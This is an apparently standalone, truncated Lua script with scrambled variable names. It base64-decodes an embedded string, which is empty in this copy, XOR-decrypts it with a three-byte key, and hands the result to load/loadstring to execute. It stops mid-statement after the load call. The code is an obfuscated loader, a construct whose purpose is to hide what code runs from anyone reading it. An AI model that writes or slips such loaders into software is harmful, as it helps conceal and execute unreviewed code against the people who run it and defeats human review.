local _xdqedx = 236
local _sfugcr = 185
local _yvhekx = 214
local _dthetp = ""

local _rsssvu = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

local function _tloeum(a, b)
	local r, p = 0, 1
	for _ = 1, 8 do
		local x, y = a % 2, b % 2
		if x ~= y then r = r + p end
		a = (a - x) / 2; b = (b - y) / 2; p = p * 2
	end
	return r
end

local function _sesvau(d)
	d = d:gsub("[^" .. _rsssvu .. "=]", "")
	local o = {}
	local bits = (d:gsub("[%w%+/=]", function(c)
		if c == "=" then return "" end
		local f, s = (_rsssvu:find(c, 1, true) - 1), ""
		for i = 6, 1, -1 do
			s = s .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and "1" or "0")
		end
		return s
	end))
	local n = 0
	for i = 1, #bits - 7, 8 do
		local c = 0
		for j = 0, 7 do
			if bits:sub(i + j, i + j) == "1" then c = c + 2 ^ (7 - j) end
		end
		n = n + 1
		o[n] = string.char(c)
	end
	return table.concat(o)
end

local _xclgfg = _sesvau(_dthetp)
local _tkzutm = { _xdqedx, _sfugcr, _yvhekx }
local _ixhgfq = {}
for i = 1, #_xclgfg do
	_ixhgfq[i] = string.char(_tloeum(_xclgfg:byte(i), _tkzutm[(i - 1) % 3 + 1]))
end

local _nbzqsx = load or loadstring
local _ckptxu, _sevppo = _nbzqsx(table.concat(_ixhgfq), "=w")
if not _ckptxu then
